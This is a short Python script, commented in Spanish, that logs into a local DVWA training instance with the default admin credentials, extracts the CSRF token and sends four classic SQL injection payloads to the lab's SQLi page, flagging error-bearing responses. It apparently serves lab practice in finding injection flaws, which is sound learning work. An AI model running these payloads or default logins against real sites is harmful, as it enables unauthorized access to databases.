import requests

# URL base de DVWA
base_url = "http://127.0.0.1/dvwa/"

# Sesión para guardar cookies
session = requests.Session()

# Credenciales por defecto
login_url = base_url + "login.php"
login_data = {
    "username": "admin",
    "password": "password",
    "Login": "Login"
}

# 1. INICIAR SESIÓN
print("[+] Iniciando sesión en DVWA...")

# DVWA requiere el token CSRF
login_page = session.get(login_url)
token = login_page.text.split('user_token" value="')[1].split('"')[0]

login_data["user_token"] = token

session.post(login_url, data=login_data)

# 2. URL vulnerable
vuln_url = base_url + "vulnerabilities/sqli/?id="

payloads = [
    "1'",
    "1'--",
    "1' OR '1'='1",
    "1' UNION SELECT null,null--"
]

print("[+] Enviando payloads...")

for p in payloads:
    url = vuln_url + p + "&Submit=Submit"
    r = session.get(url)

    if "error" in r.text.lower() or "sql" in r.text.lower():
        print(f"[!] Posible SQLi detectada con payload: {p}")
    else:
        print(f"[-] Sin indicios con payload: {p}")
